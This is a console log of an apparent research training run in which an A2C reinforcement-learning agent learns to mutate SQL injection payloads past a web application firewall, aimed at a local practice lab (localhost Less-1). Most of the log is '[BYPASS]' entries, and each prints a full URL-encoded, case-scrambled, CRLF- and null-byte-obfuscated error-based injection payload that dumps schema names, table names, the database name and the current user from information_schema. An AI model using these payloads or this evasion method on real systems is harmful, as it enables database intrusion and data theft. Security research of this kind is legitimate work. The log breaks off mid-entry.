/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run A2C on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — A2C Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Rollout     : n_steps=5 (synchronous A3C variant)
 Seed        : 1
============================================================
  Ep   10 | SR=0% | Steps=15.0 | R=-45.01
  Ep 5820 | SR=10% | Steps=14.0 | R=-30.54
  Ep 5830 | SR=0% | Steps=15.0 | R=-35.04
  Ep 5840 | SR=0% | Steps=15.0 | R=-35.22
  Ep 5850 | SR=0% | Steps=15.0 | R=-36.15
  Ep 5860 | SR=0% | Steps=15.0 | R=-35.00
  [BYPASS] Ep 5865 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aaNd%0d%0aEXP(~(SelecT%0d%0a*%0d%0aFROm%0d%0a(sELeCt%0d%0a((seLEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOm%0d%0aiNFormATiON_sChEMA.schemata))
  Ep 5870 | SR=10% | Steps=13.9 | R=-30.28
  Ep 5880 | SR=0% | Steps=15.0 | R=-35.40
  Ep 5890 | SR=0% | Steps=15.0 | R=-35.46
  Ep 5900 | SR=0% | Steps=15.0 | R=-35.49
  Ep 5910 | SR=0% | Steps=15.0 | R=-34.05
  Ep 5920 | SR=0% | Steps=15.0 | R=-35.37
  [BYPASS] Ep 5930 | steps=6 | seq=case -> null_byte -> crlf -> case -> case -> agg_swap
           payload: 1'%0d%0aaNd%0d%0aEXP(~(sELeCT%0d%0a*%0d%0aFRoM%0d%0a(sELect%0d%0a((seLecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrom%0d%0aInforMaTiOn_ScHemA.schemata))
  Ep 5930 | SR=10% | Steps=14.1 | R=-31.74
  Ep 5940 | SR=0% | Steps=15.0 | R=-35.44
  [BYPASS] Ep 5944 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aand%0d%0aEXP(~(seLECT%0d%0a*%0d%0afRom%0d%0a(selecT%0d%0a((SelECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0aiNfoRmATION_SchEmA.schemata))
  [BYPASS] Ep 5945 | steps=12 | seq=case -> null_byte -> crlf -> hex_to_char -> case -> case -> case -> case -> case -> case -> case -> agg_swap
           payload: 1'%0d%0aAnd%0d%0aEXP(~(selEcT%0d%0a*%0d%0afrom%0d%0a(SeLeCT%0d%0a((sElecT%0d%0aJSON_ARRAYAGG(CONCAT(TabLe_schema,CHAR(46),TabLE_name))%0d%0aFroM%0d%0a
  Ep 5950 | SR=20% | Steps=13.6 | R=-29.37
  Ep 5960 | SR=0% | Steps=15.0 | R=-34.85
  Ep 5970 | SR=0% | Steps=15.0 | R=-35.66
  Ep 5980 | SR=0% | Steps=15.0 | R=-35.76
  Ep 5990 | SR=0% | Steps=15.0 | R=-36.09
  Ep 6000 | SR=0% | Steps=15.0 | R=-35.68
  Ep 6010 | SR=0% | Steps=15.0 | R=-35.63
  Ep 6020 | SR=0% | Steps=15.0 | R=-35.23
  [BYPASS] Ep 6024 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aand%0d%0aEXP(~(seLeCt%0d%0a*%0d%0aFROm%0d%0a(selECT%0d%0a((selecT%0d%0aJSON_ARRAYAGG(COncAt(tABle_schema,CHAR(46),tabLE_name))%0d%0aFrom%0d%0a
  [BYPASS] Ep 6030 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aaND%0d%0aEXP(~(SelEcT%0d%0a*%0d%0afRoM%0d%0a(sELEcT%0d%0a((seLECt%0d%0aJSON_ARRAYAGG(ConcaT(tAblE_schema,CHAR(46),tABLE_name))%0d%0aFrOm%0d%0a
  Ep 6030 | SR=20% | Steps=13.0 | R=-26.84
  Ep 6040 | SR=0% | Steps=15.0 | R=-35.46
  Ep 6050 | SR=0% | Steps=15.0 | R=-35.20
  Ep 6060 | SR=0% | Steps=15.0 | R=-36.03
  [BYPASS] Ep 6066 | steps=9 | seq=case -> agg_swap -> case -> case -> agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAnd%0d%0aEXP(~(SELEct%0d%0a*%0d%0aFroM%0d%0a(SEleCt%0d%0a((SElEct%0d%0aJSON_ARRAYAGG(CoNcat(TAble_schema,CHAR(46),TAbLe_name))%0d%0aFRoM%0d%0a
  Ep 6070 | SR=10% | Steps=14.4 | R=-31.99
  Ep 6080 | SR=0% | Steps=15.0 | R=-35.89
  Ep 6090 | SR=0% | Steps=15.0 | R=-36.17
  Ep 6100 | SR=0% | Steps=15.0 | R=-34.12
  [BYPASS] Ep 6106 | steps=5 | seq=agg_swap -> hex_to_char -> null_byte -> crlf -> case
           payload: 1'%0d%0aAnD%0d%0aEXP(~(sElECt%0d%0a*%0d%0afroM%0d%0a(SeLeCt%0d%0a((sElEct%0d%0aJSON_ARRAYAGG(ConcaT(tabLE_schema,CHAR(46),TAble_name))%0d%0aFRom%0d%0a
  Ep 6110 | SR=10% | Steps=14.0 | R=-31.51
  [BYPASS] Ep 6120 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAnd%0d%0aEXP(~(SeLECt%0d%0a*%0d%0aFrOm%0d%0a(SElEct%0d%0a((sELECT%0d%0aJSON_ARRAYAGG(CoNCaT(tAblE_schema,CHAR(46),tabLE_name))%0d%0aFROM%0d%0a
  Ep 6120 | SR=10% | Steps=14.0 | R=-31.65
  Ep 6130 | SR=0% | Steps=15.0 | R=-34.84
  Ep 6140 | SR=0% | Steps=15.0 | R=-35.97
  [BYPASS] Ep 6145 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aanD%0d%0aEXP(~(SeleCT%0d%0a*%0d%0afROM%0d%0a(SeLEcT%0d%0a((seleCt%0d%0aJSON_ARRAYAGG(ConCaT(tabLe_schema,CHAR(46),tAblE_name))%0d%0aFrOM%0d%0a
  Ep 6150 | SR=10% | Steps=14.0 | R=-29.32
  [BYPASS] Ep 6153 | steps=13 | seq=case -> null_byte -> crlf -> hex_to_char -> case -> case -> case -> case -> case -> case -> case -> case -> agg_swap
           payload: 1'%0d%0aAnd%0d%0aEXP(~(SElECt%0d%0a*%0d%0afRom%0d%0a(selecT%0d%0a((SELEcT%0d%0aJSON_ARRAYAGG(CONCAT(Table_schema,CHAR(46),tablE_name))%0d%0afROM%0d%0a
  Ep 6160 | SR=10% | Steps=14.8 | R=-33.66
  Ep 6170 | SR=0% | Steps=15.0 | R=-36.49
  Ep 6180 | SR=0% | Steps=15.0 | R=-32.72
  Ep 6190 | SR=0% | Steps=15.0 | R=-35.73
  [BYPASS] Ep 6195 | steps=14 | seq=case -> null_byte -> crlf -> case -> case -> case -> case -> case -> case -> case -> case -> case -> case -> agg_swap
           payload: 1'%0d%0aand%0d%0aEXP(~(SElecT%0d%0a*%0d%0afRom%0d%0a(SELEcT%0d%0a((sElect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFROM%0d%0aInfOrmatION_SCHEmA.schemata))
  Ep 6200 | SR=10% | Steps=14.9 | R=-31.69
  [BYPASS] Ep 6203 | steps=6 | seq=agg_swap -> agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aand%0d%0aEXP(~(SelECt%0d%0a*%0d%0aFrOm%0d%0a(sElEct%0d%0a((seLEcT%0d%0aJSON_ARRAYAGG(COncat(TAbLe_schema,CHAR(46),TAbLe_name))%0d%0afRom%0d%0a
  [BYPASS] Ep 6209 | steps=5 | seq=paren_full -> case -> null_byte -> crlf -> agg_swap
           payload: 1'%0d%0aANd%0d%0aEXP(~(sELECT%0d%0a*%0d%0afROM%0d%0a(SELEct%0d%0a((sELect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrom%0d%0ainFOrMatION_ScHEMA.schemata))
  Ep 6210 | SR=20% | Steps=13.1 | R=-26.89
  [BYPASS] Ep 6218 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAnD%0d%0aEXP(~(SeLeCT%0d%0a*%0d%0aFRom%0d%0a(sELECT%0d%0a((SeLect%0d%0aJSON_ARRAYAGG(coNCAt(taBLe_schema,CHAR(46),TABLe_name))%0d%0afrom%0d%0a
  Ep 6220 | SR=10% | Steps=14.0 | R=-27.51
  [BYPASS] Ep 6221 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAnD%0d%0aEXP(~(seLect%0d%0a*%0d%0afRom%0d%0a(sELeCt%0d%0a((sELEcT%0d%0aJSON_ARRAYAGG(CONCAt(tABLe_schema,CHAR(46),tABle_name))%0d%0afrOM%0d%0a
  Ep 6230 | SR=10% | Steps=14.0 | R=-29.41
  Ep 6240 | SR=0% | Steps=15.0 | R=-33.70
  Ep 6250 | SR=0% | Steps=15.0 | R=-35.52
  [BYPASS] Ep 6253 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAnD%0d%0aEXP(~(selecT%0d%0a*%0d%0afRom%0d%0a(sELECT%0d%0a((SeLEcT%0d%0aJSON_ARRAYAGG(coNCaT(TAbLe_schema,CHAR(46),taBLE_name))%0d%0aFROm%0d%0a
  Ep 6260 | SR=10% | Steps=14.0 | R=-33.53
  Ep 6270 | SR=0% | Steps=15.0 | R=-35.77
  Ep 6280 | SR=0% | Steps=15.0 | R=-34.22
  Ep 6290 | SR=0% | Steps=15.0 | R=-33.62
  Ep 6300 | SR=0% | Steps=15.0 | R=-34.22
  Ep 6310 | SR=0% | Steps=15.0 | R=-35.29
  Ep 6320 | SR=0% | Steps=15.0 | R=-34.83
  Ep 6330 | SR=0% | Steps=15.0 | R=-35.67
  Ep 6340 | SR=0% | Steps=15.0 | R=-34.75
  Ep 6350 | SR=0% | Steps=15.0 | R=-36.17
  Ep 6360 | SR=0% | Steps=15.0 | R=-35.21
  [BYPASS] Ep 6367 | steps=6 | seq=agg_swap -> case -> null_byte -> crlf -> case -> hex_to_char
           payload: 1'%0d%0aand%0d%0aEXP(~(sEleCT%0d%0a*%0d%0aFRom%0d%0a(sEleCt%0d%0a((SELect%0d%0aJSON_ARRAYAGG(cOnCAt(TAblE_schema,CHAR(46),TABLE_name))%0d%0aFroM%0d%0a
  Ep 6370 | SR=10% | Steps=14.1 | R=-31.90
  Ep 6380 | SR=0% | Steps=15.0 | R=-34.94
  Ep 6390 | SR=0% | Steps=15.0 | R=-33.34
  [BYPASS] Ep 6396 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aand%0d%0aEXP(~(selEct%0d%0a*%0d%0afroM%0d%0a(sElECt%0d%0a((sELEct%0d%0aJSON_ARRAYAGG(COnCaT(TaBle_schema,CHAR(46),tAble_name))%0d%0aFROm%0d%0a
  Ep 6400 | SR=10% | Steps=14.0 | R=-32.12
  Ep 6410 | SR=0% | Steps=15.0 | R=-36.55
  Ep 6420 | SR=0% | Steps=15.0 | R=-35.98
  Ep 6430 | SR=0% | Steps=15.0 | R=-35.93
  Ep 6440 | SR=0% | Steps=15.0 | R=-35.33
  [BYPASS] Ep 6450 | steps=7 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char -> case -> func_sp_nbsp
           payload: 1'%0d%0aAND%0d%0aEXP(~(sELeCt%0d%0a*%0d%0aFrom%0d%0a(SeLEct%0d%0a((seLecT%0d%0acoNCaT(CHAR(124),JSON_ARRAYAGG(tabLE_name),CHAR(124))%0d%0afrom%0d%0aiN
  Ep 6450 | SR=10% | Steps=14.2 | R=-31.29
  [BYPASS] Ep 6455 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aanD%0d%0aEXP(~(SElECt%0d%0a*%0d%0afRom%0d%0a(seLeCt%0d%0a((SElecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOm%0d%0aINforMAtIoN_SCheMa.schemata))
  Ep 6460 | SR=10% | Steps=13.9 | R=-31.31
  Ep 6470 | SR=0% | Steps=15.0 | R=-34.59
  Ep 6480 | SR=0% | Steps=15.0 | R=-35.32
  [BYPASS] Ep 6483 | steps=10 | seq=case -> null_byte -> crlf -> case -> case -> case -> case -> case -> case -> func_sp_nbsp
           payload: 1'%0d%0aAnD%0d%0aEXP(~(sELEcT%0d%0a*%0d%0aFrOm%0d%0a(seleCt%0d%0a(DAtAbAsE%a0()))a));%00
  Ep 6490 | SR=10% | Steps=14.5 | R=-33.01
  [BYPASS] Ep 6494 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aaNd%0d%0aEXP(~(sELect%0d%0a*%0d%0aFRoM%0d%0a(SelECT%0d%0a((sELECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrom%0d%0ainformaTiON_ScHEmA.schemata))
  Ep 6500 | SR=10% | Steps=13.9 | R=-31.36
  Ep 6510 | SR=0% | Steps=15.0 | R=-32.42
  [BYPASS] Ep 6511 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aand%0d%0aEXP(~(SeLeCt%0d%0a*%0d%0afrOM%0d%0a(SelECT%0d%0a((seleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOM%0d%0aInForMATiON_SCheMa.schemata))
  [BYPASS] Ep 6517 | steps=6 | seq=agg_swap -> case -> null_byte -> crlf -> case -> hex_to_char
           payload: 1'%0d%0aAND%0d%0aEXP(~(sEleCt%0d%0a*%0d%0aFrOm%0d%0a(SElecT%0d%0a((SELECt%0d%0aJSON_ARRAYAGG(coNCAT(tABlE_schema,CHAR(46),TABle_name))%0d%0afrOm%0d%0a
  Ep 6520 | SR=20% | Steps=13.0 | R=-27.40
  Ep 6530 | SR=0% | Steps=15.0 | R=-35.08
  Ep 6540 | SR=0% | Steps=15.0 | R=-32.95
  Ep 6550 | SR=0% | Steps=15.0 | R=-35.61
  [BYPASS] Ep 6553 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAnD%0d%0aEXP(~(SElEct%0d%0a*%0d%0aFrOM%0d%0a(SelEct%0d%0a((seLECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOM%0d%0aiNfoRMAtiON_sCHeMa.schemata))
  [BYPASS] Ep 6554 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAND%0d%0aEXP(~(sELECT%0d%0a*%0d%0aFROM%0d%0a(SelEct%0d%0a((SelECt%0d%0aJSON_ARRAYAGG(coNcat(tABle_schema,CHAR(46),taBlE_name))%0d%0afrom%0d%0a
  [BYPASS] Ep 6555 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAND%0d%0aEXP(~(sELECt%0d%0a*%0d%0afroM%0d%0a(selEcT%0d%0a((seLeCt%0d%0aJSON_ARRAYAGG(coNCaT(table_schema,CHAR(46),taBLE_name))%0d%0afRom%0d%0a
  Ep 6560 | SR=30% | Steps=11.9 | R=-23.29
  Ep 6570 | SR=0% | Steps=15.0 | R=-32.53
  Ep 6580 | SR=0% | Steps=15.0 | R=-32.80
  [BYPASS] Ep 6586 | steps=6 | seq=agg_swap -> case -> null_byte -> crlf -> case -> hex_to_char
           payload: 1'%0d%0aAnD%0d%0aEXP(~(SelecT%0d%0a*%0d%0aFRoM%0d%0a(SeLeCT%0d%0a((sElECT%0d%0aJSON_ARRAYAGG(CoNCAt(TaBle_schema,CHAR(46),taBLe_name))%0d%0aFrOM%0d%0a
  Ep 6590 | SR=10% | Steps=14.1 | R=-32.10
  [BYPASS] Ep 6599 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAnD%0d%0aEXP(~(sELECt%0d%0a*%0d%0afROM%0d%0a(SeLect%0d%0a((seleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRoM%0d%0ainfOrmaTIOn_schEMA.schemata))
  [BYPASS] Ep 6600 | steps=7 | seq=agg_swap -> case -> null_byte -> crlf -> case -> case -> func_sp_nbsp
           payload: 1'%0d%0aAND%0d%0aEXP(~(SElecT%0d%0a*%0d%0afrom%0d%0a(SelECT%0d%0a(user%a0()))a));%00
  Ep 6600 | SR=20% | Steps=13.1 | R=-25.62
  [BYPASS] Ep 6608 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAND%0d%0aEXP(~(seLeCt%0d%0a*%0d%0aFroM%0d%0a(SElECt%0d%0a((SeleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRoM%0d%0ainFORmATIon_schEmA.schemata))
  Ep 6610 | SR=10% | Steps=13.9 | R=-29.64
  Ep 6620 | SR=0% | Steps=15.0 | R=-32.13
  [BYPASS] Ep 6629 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aand%0d%0aEXP(~(selECt%0d%0a*%0d%0aFrOm%0d%0a(SeLect%0d%0a((selECT%0d%0aJSON_ARRAYAGG(coNCAT(tablE_schema,CHAR(46),tABle_name))%0d%0afROM%0d%0a
  Ep 6630 | SR=10% | Steps=14.0 | R=-31.09
  [BYPASS] Ep 6638 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aaNd%0d%0aEXP(~(seleCt%0d%0a*%0d%0afroM%0d%0a(SeLEct%0d%0a((SelECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRoM%0d%0aINfOrMATiON_sCHeMA.schemata))
  Ep 6640 | SR=10% | Steps=13.9 | R=-31.37
  [BYPASS] Ep 6647 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aANd%0d%0aEXP(~(SelEct%0d%0a*%0d%0aFrOM%0d%0a(SeleCt%0d%0a((SeLecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROM%0d%0aInFORmAtION_SCHEMa.schemata))
  Ep 6650 | SR=10% | Steps=13.9 | R=-29.64
  [BYPASS] Ep 6655 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aaND%0d%0aEXP(~(SeleCt%0d%0a*%0d%0afRoM%0d%0a(sELEct%0d%0a((sElect%0d%0aJSON_ARRAYAGG(cOncAt(tabLE_schema,CHAR(46),tABle_name))%0d%0afrOm%0d%0a
  [BYPASS] Ep 6660 | steps=7 | seq=agg_swap -> func_sp_nbsp -> agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aand%0d%0aEXP(~(seLEct%0d%0a*%0d%0afROM%0d%0a(seLeCt%0d%0a((SeleCT%0d%0aconCaT(CHAR(124),JSON_ARRAYAGG(TablE_name),CHAR(124))%0d%0afrOM%0d%0ain
  Ep 6660 | SR=20% | Steps=13.2 | R=-25.99
  [BYPASS] Ep 6668 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAND%0d%0aEXP(~(seLECt%0d%0a*%0d%0aFrom%0d%0a(sELEct%0d%0a((SElECT%0d%0aJSON_ARRAYAGG(concAt(TABlE_schema,CHAR(46),tABlE_name))%0d%0afROm%0d%0a
  Ep 6670 | SR=10% | Steps=14.0 | R=-31.34
  Ep 6680 | SR=0% | Steps=15.0 | R=-34.10
  Ep 6690 | SR=0% | Steps=15.0 | R=-35.00
  [BYPASS] Ep 6698 | steps=7 | seq=agg_swap -> case -> null_byte -> crlf -> case -> case -> hex_to_char
           payload: 1'%0d%0aaND%0d%0aEXP(~(SelEct%0d%0a*%0d%0afrom%0d%0a(SeLECt%0d%0a((SeLECT%0d%0aJSON_ARRAYAGG(cOnCAT(TABLe_schema,CHAR(46),taBlE_name))%0d%0afROm%0d%0a
  Ep 6700 | SR=10% | Steps=14.2 | R=-27.49
  Ep 6710 | SR=0% | Steps=15.0 | R=-33.14
  Ep 6720 | SR=0% | Steps=15.0 | R=-32.00
  Ep 6730 | SR=0% | Steps=15.0 | R=-31.57
  Ep 6740 | SR=0% | Steps=15.0 | R=-33.19
  [BYPASS] Ep 6743 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aANd%0d%0aEXP(~(sELeCt%0d%0a*%0d%0aFRoM%0d%0a(sEleCt%0d%0a((sEleCt%0d%0aJSON_ARRAYAGG(coNCAT(TaBLe_schema,CHAR(46),TabLe_name))%0d%0aFRoM%0d%0a
  [BYPASS] Ep 6750 | steps=9 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char -> case -> case -> case -> func_sp_nbsp
           payload: 1'%0d%0aAnd%0d%0aEXP(~(SELeCT%0d%0a*%0d%0aFRom%0d%0a(SeLECt%0d%0a((SeLeCt%0d%0aCOncAT(CHAR(124),JSON_ARRAYAGG(table_name),CHAR(124))%0d%0afrOm%0d%0aIn
  Ep 6750 | SR=20% | Steps=13.4 | R=-25.31
  Ep 6760 | SR=0% | Steps=15.0 | R=-35.70
  Ep 6770 | SR=0% | Steps=15.0 | R=-34.70
  Ep 6780 | SR=0% | Steps=15.0 | R=-34.82
  [BYPASS] Ep 6781 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAnd%0d%0aEXP(~(selEct%0d%0a*%0d%0afroM%0d%0a(seLect%0d%0a((SELect%0d%0aJSON_ARRAYAGG(COncAT(tAbLe_schema,CHAR(46),tABlE_name))%0d%0afrOm%0d%0a
  [BYPASS] Ep 6787 | steps=6 | seq=agg_swap -> case -> null_byte -> crlf -> case -> hex_to_char
           payload: 1'%0d%0aANd%0d%0aEXP(~(SeleCt%0d%0a*%0d%0aFRom%0d%0a(sElect%0d%0a((SELEct%0d%0aJSON_ARRAYAGG(coNcat(TaBLe_schema,CHAR(46),TABLe_name))%0d%0afrom%0d%0a
  Ep 6790 | SR=20% | Steps=13.1 | R=-27.49
  Ep 6800 | SR=0% | Steps=15.0 | R=-33.86
  [BYPASS] Ep 6808 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAND%0d%0aEXP(~(SElEct%0d%0a*%0d%0afrOm%0d%0a(seLect%0d%0a((seLecT%0d%0aJSON_ARRAYAGG(cONCAt(tABle_schema,CHAR(46),tAblE_name))%0d%0aFroM%0d%0a
  Ep 6810 | SR=10% | Steps=14.0 | R=-25.75
  Ep 6820 | SR=0% | Steps=15.0 | R=-35.01
  Ep 6830 | SR=0% | Steps=15.0 | R=-34.07
  [BYPASS] Ep 6837 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAnD%0d%0aEXP(~(SelECT%0d%0a*%0d%0aFrOM%0d%0a(seLect%0d%0a((SELecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRoM%0d%0ainfoRMAtIoN_SCheMA.schemata))
  Ep 6840 | SR=10% | Steps=13.9 | R=-29.78
  Ep 6850 | SR=0% | Steps=15.0 | R=-34.70
  [BYPASS] Ep 6858 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAND%0d%0aEXP(~(seLect%0d%0a*%0d%0afROm%0d%0a(selECt%0d%0a((SeLEct%0d%0aJSON_ARRAYAGG(cOncAt(TABLE_schema,CHAR(46),TaBlE_name))%0d%0aFRom%0d%0a
  Ep 6860 | SR=10% | Steps=14.0 | R=-28.99
  [BYPASS] Ep 6869 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAnD%0d%0aEXP(~(sELeCT%0d%0a*%0d%0afROM%0d%0a(SEleCt%0d%0a((seLEcT%0d%0aJSON_ARRAYAGG(concAT(tABlE_schema,CHAR(46),TAbLE_name))%0d%0aFRom%0d%0a
  [BYPASS] Ep 6870 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aand%0d%0aEXP(~(seleCt%0d%0a*%0d%0aFROM%0d%0a(sELECT%0d%0a((SElecT%0d%0aJSON_ARRAYAGG(concAT(tAble_schema,CHAR(46),TAbLe_name))%0d%0aFrom%0d%0a
  Ep 6870 | SR=20% | Steps=13.0 | R=-27.44
  Ep 6880 | SR=0% | Steps=15.0 | R=-33.07
  Ep 6890 | SR=0% | Steps=15.0 | R=-35.85
  [BYPASS] Ep 6896 | steps=6 | seq=agg_swap -> case -> null_byte -> crlf -> case -> hex_to_char
           payload: 1'%0d%0aaND%0d%0aEXP(~(SELEcT%0d%0a*%0d%0aFrOM%0d%0a(seLecT%0d%0a((SELect%0d%0aJSON_ARRAYAGG(ConCaT(TABLe_schema,CHAR(46),TAble_name))%0d%0afroM%0d%0a
  Ep 6900 | SR=10% | Steps=14.1 | R=-30.20
  [BYPASS] Ep 6907 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAnD%0d%0aEXP(~(SElECT%0d%0a*%0d%0aFroM%0d%0a(SElECT%0d%0a((SeLEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0aInfORmatIOn_sCheMA.schemata))
  Ep 6910 | SR=10% | Steps=13.9 | R=-29.27
  Ep 6920 | SR=0% | Steps=15.0 | R=-34.90
  Ep 6930 | SR=0% | Steps=15.0 | R=-34.93
  [BYPASS] Ep 6940 | steps=6 | seq=agg_swap -> case -> null_byte -> crlf -> case -> hex_to_char
           payload: 1'%0d%0aAnd%0d%0aEXP(~(SeLeCt%0d%0a*%0d%0afROM%0d%0a(SeLecT%0d%0a((SELecT%0d%0aJSON_ARRAYAGG(Concat(TABLe_schema,CHAR(46),TaBLE_name))%0d%0afROm%0d%0a
  Ep 6940 | SR=10% | Steps=14.1 | R=-29.61
  Ep 6950 | SR=0% | Steps=15.0 | R=-33.93
  Ep 6960 | SR=0% | Steps=15.0 | R=-36.08
  [BYPASS] Ep 6969 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aaNd%0d%0aEXP(~(SELeCT%0d%0a*%0d%0aFROM%0d%0a(sElECT%0d%0a((sElect%0d%0aJSON_ARRAYAGG(conCAt(tabLE_schema,CHAR(46),TaBLE_name))%0d%0afrom%0d%0a
  Ep 6970 | SR=10% | Steps=14.0 | R=-29.70
  Ep 6980 | SR=0% | Steps=15.0 | R=-34.55
  Ep 6990 | SR=0% | Steps=15.0 | R=-34.43
  [BYPASS] Ep 6994 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aanD%0d%0aEXP(~(SELecT%0d%0a*%0d%0afROm%0d%0a(seleCT%0d%0a((sEleCT%0d%0aJSON_ARRAYAGG(cONcAt(TabLE_schema,CHAR(46),tAbLe_name))%0d%0afRom%0d%0a
  [BYPASS] Ep 6998 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
